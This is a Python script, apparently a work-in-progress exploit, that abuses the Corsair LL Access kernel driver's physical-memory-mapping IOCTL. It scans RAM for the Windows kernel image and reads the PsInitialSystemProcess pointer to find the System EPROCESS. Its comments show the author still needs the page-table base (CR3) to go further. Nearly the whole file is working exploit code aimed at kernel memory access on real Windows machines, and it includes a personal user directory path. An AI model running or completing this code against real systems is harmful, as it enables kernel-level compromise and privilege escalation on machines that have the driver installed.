
import ctypes
import struct
import os

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
_MAP_CACHE = {}

def map_page(h, pa):
    pa &= ~0xFFF
    if pa in _MAP_CACHE: return _MAP_CACHE[pa]
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    _MAP_CACHE[pa] = out.value
    return out.value

def read16(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    return bytes((ctypes.c_ubyte * 16).from_address(v + (pa & 0xFFF)))

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
        print(f"[-] Driver Error {ctypes.get_last_error()}")
        return

    print("[*] Scanning for ntoskrnl physical base (MZ header)...")
    # ntoskrnl is almost always in the first 128MB-256MB of RAM
    # And it's always 2MB aligned (0x200000)
    for pa in range(0x0, 0x20000000, 0x200000): 
        data = read16(h, pa)
        if data and data[:2] == b"MZ":
            # Verify it's actually ntoskrnl by checking for a known string
            # or PE signature
            v = map_page(h, pa)
            pe_off = struct.unpack_from("<I", data, 0x3C)[0]
            pe_data = read16(h, pa + pe_off)
            if pe_data and pe_data[:4] == b"PE\0\0":
                print(f"[+] Found kernel physical base: 0x{pa:X}")
                
                # Now we have ntoskrnl's physical address.
                # The Virtual Address is 0xFFFFF8049EA00000 (from your earlier run).
                # The offset between them is constant for the kernel image.
                
                # We need PsInitialSystemProcess.
                import sys
                sys.path.append(r"C:\Users\justin hernando\Documents\VulnDriver")
                from driver_interact import get_ntoskrnl_base, load_lstar_signature
                from get_system_cr3 import pe_export_rva
                
                ntos_va = get_ntoskrnl_base()
                rva = pe_export_rva(r"C:\Windows\System32\ntoskrnl.exe", "PsInitialSystemProcess")
                
                # Physical address of the pointer
                ptr_pa = pa + rva
                print(f"[*] PsInitialSystemProcess ptr PA: 0x{ptr_pa:X}")
                
                ptr_val_raw = read16(h, ptr_pa)
                eprocess_va = struct.unpack("<Q", ptr_val_raw[:8])[0]
                print(f"[+] System EPROCESS VA: 0x{eprocess_va:X}")
                
                # Now we need the physical address of the EPROCESS structure
                # This is the tricky part: EPROCESS is in pool memory, not static kernel.
                # BUT, the DirectoryTableBase (CR3) is often at a fixed offset.
                # If we could just find ONE translation, we'd be set.
                
                print("[!] Found kernel base, but EPROCESS is dynamic. Still need CR3.")
                print("[*] Checking if we can find a PML4 signature nearby...")
                
    print("[-] Finished scan.")

if __name__ == "__main__":
    main()
